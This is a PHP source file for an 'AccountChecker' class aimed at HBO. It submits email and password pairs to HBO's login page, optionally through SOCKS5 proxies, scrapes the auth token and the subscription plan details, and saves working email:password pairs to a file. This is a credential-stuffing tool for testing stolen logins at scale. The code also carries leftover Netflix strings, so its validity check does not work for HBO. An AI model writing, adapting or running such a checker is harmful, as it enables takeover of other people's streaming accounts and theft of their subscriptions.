<?php

namespace Markoftw\AccountChecker;

use Markoftw\AccountChecker\Webrequests\Webrequests as Webrequests;
use Markoftw\AccountChecker\Functions\Functions as Functions;

class HBO extends Webrequests
{

    private $_LOGIN_URL = "http://www.hbo.com/login";
    private $_LOGOUT_URL = "http://www.hbo.com/logout";
    private $_PROFILE_URL = "http://www.hbo.com/dashboard/account";

    private $_PROXY,
        $_TYPE,
        $_EMAIL,
        $_PASSWORD,
        $_FILE,
        $_VALID,
        $_PLAN,
        $_TIMER,
        $_RESULTS;

    private static $_INSTANCE;
    private static $_SERVICE = "hbo";

    public function __construct()
    {
        self::$_INSTANCE = new Webrequests();
        $this->_VALID = "FALSE";
        $this->_RESULTS = [];
        $this->_TIMER = Functions::timer();
    }

    /**
     * Set curl proxy.
     *
     * @param $proxy
     * @param string $type
     * @return $this
     */
    public function proxy($proxy, $type = "SOCKS5")
    {
        $this->_PROXY = $proxy;
        $this->_TYPE = $type;
        $this->_RESULTS['PROXY'] = $proxy;
        $this->_RESULTS['TYPE'] = $type;
        return $this;
    }

    /**
     * Checking the provided account.
     *
     * @param $email
     * @param $password
     * @return $this
     */
    public function check($email, $password)
    {
        $this->_EMAIL = $email;
        $this->_PASSWORD = $password;
        $this->_RESULTS['EMAIL'] = $email;
        $this->_RESULTS['PASSWORD'] = $password;

        if (!empty($this->_PROXY)) {
            $use_proxy = true;
            $proxy = array($ip = $this->_PROXY, $type = $this->_TYPE);
        } else {
            $use_proxy = false;
            $proxy = array("", "");
        }

        self::$_INSTANCE->request(self::$_SERVICE, $this->_LOGOUT_URL, $use_proxy, $proxy);
        $login_body = self::$_INSTANCE->request(self::$_SERVICE, $this->_LOGIN_URL, $use_proxy, $proxy);
        $auth = explode('"/>', explode('name="authURL" value="', $login_body)[1])[0];
        if (!strpos($auth, "data-reactid")) {
            $post_data = "email=" . urlencode($email) . "&password=" . $password . "&authURL=" . urlencode($auth) . '&RememberMe=false';
        } else {
            preg_match('/<input type="hidden" name="authURL" value="([^"]*)" data-reactid="([^"]*)">/', $login_body, $match);
            $post_data = "email=" . $email . "&password=" . $password . "&rememberMeCheckbox=false&flow=websiteSignUp&mode=login&action=loginAction&withFields=email,password,rememberMe,nextPage&authURL=" . $match[1];
        }
        $post_body = self::$_INSTANCE->request(self::$_SERVICE, $this->_LOGIN_URL, $use_proxy, $proxy, true, $post_data);

        if (strpos($post_body, "Sign out of Netflix")) {
            $this->_RESULTS['VALID'] = "TRUE";
        } else {
            $this->_RESULTS['VALID'] = $this->_VALID;
        }

        $this->_TIMER = round((Functions::timer() - $this->_TIMER), 4);
        $this->_RESULTS['LOADTIME'] = $this->_TIMER;

        return $this;
    }

    /**
     * Check and get membership plan for the account.
     *
     * @return $this
     */
    public function plan()
    {
        if (!empty($this->_PROXY)) {
            $use_proxy = true;
            $proxy = array($ip = $this->_PROXY, $type = $this->_TYPE);
        } else {
            $use_proxy = false;
            $proxy = array("", "");
        }

        if($this->_VALID == "TRUE")
        {
            $profile_body = self::$_INSTANCE->request(self::$_SERVICE, $this->_PROFILE_URL, $use_proxy, $proxy);

            preg_match('/"maxStreams":([^"]*),"maxHours":([^"]*),(.*),"formattedDeferredEffectiveDate":"([^"]*)",(.*),"hasHD":([^"]*),"hasUHD":([^"]*),/', $profile_body, $match);

            if (!empty($match)) {
                $str = array("SCREENS" => $match[1], "HD" => $match[6], "UHD" => $match[7], "RENEW" => $match[4]);
            } else {
                $str = "";
            }
            $this->_PLAN = $str;
            $this->_RESULTS['PLAN'] = $this->_PLAN;
        }

        return $this;
    }

    /**
     * Saving results to file.
     *
     * @param string $file
     * @return $this
     */
    public function save($file = "results_hbo.txt")
    {
        if (!file_exists($file) || !is_writable($file)) {
            echo '<br/>' . $file . ' missing or not writable.<br/>';
            exit;
        }
        $this->_FILE = $file;
        $this->_RESULTS['COMPLETED'] = $this->_FILE;

        if ($this->_VALID != "FALSE") {
            $write_file = fopen($this->_FILE, "w") or die("Unable to open file!");
            $txt = "NETFLIX:" . $this->_EMAIL . ":" . $this->_PASSWORD . ":" . $this->_VALID . "\n";
            fwrite($write_file, $txt);
            fclose($write_file);
        }

        return $this;
    }

    /**
     * Return array.
     *
     * @return mixed
     */
    public function get()
    {
        return Functions::cleanKeys($this->_RESULTS);
    }

    /**
     * Return JSON.
     *
     * @return string
     */
    public function json()
    {
        return Functions::toJson(Functions::cleanKeys($this->_RESULTS));
    }

}
